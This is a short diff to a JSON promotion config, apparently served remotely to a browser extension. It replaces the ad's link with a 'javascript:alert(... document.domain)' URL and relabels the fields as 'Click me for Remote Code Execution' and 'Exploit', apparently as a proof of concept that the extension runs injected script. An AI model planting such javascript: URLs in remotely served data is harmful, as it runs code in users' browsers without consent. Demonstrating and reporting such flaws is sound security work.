@@ -1,16 +1,16 @@
 {
-  "url": "https://example.com",
+  "url": "javascript:alert('XSS! Code executed from: ' + document.domain);",
   "image": {
-    "url": "https://placehold.co/100x100/png",
+    "url": "https://placehold.co/100x100/red/white?text=XSS",
     "size": 100
   },
-  "title": "Test Promotion",
-  "text": "This is a test to verify the remote payload fetch.",
+  "title": "Click me for Remote Code Execution",
+  "text": "This proves the extension executes remote code.",
   "footer": {
-    "text": "Learn more"
+    "text": "Click to execute"
   },
   "label": {
-    "text": "Ad",
-    "url": "https://example.com/label"
+    "text": "Exploit",
+    "url": "https://example.com"
   }
 }
